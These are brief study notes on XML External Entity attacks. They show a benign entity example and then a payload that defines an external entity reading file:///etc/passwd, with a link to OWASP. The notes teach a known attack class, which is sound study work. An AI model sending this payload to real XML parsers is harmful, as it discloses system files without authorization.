XML External Entities 

* abuses systems that parse XML input
* example 
	```
	<?xml version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE gift [
			<!ENTITY from "MATT">
	]>
	<gift>
		<To>Frank</To>
		<From>&from;    Matt+Amber</From>
		<Item>Chocolate</Item>
	</gift>
	
	```
	
	* with the above example you could change the "MATT" part to something malicous 
	```
	<?xml version="1.0" encoding="ISO-8859-1"?>
	  <!DOCTYPE foo [  
	  <!ELEMENT foo ANY >
	  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
	```

[XXE Attack])https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)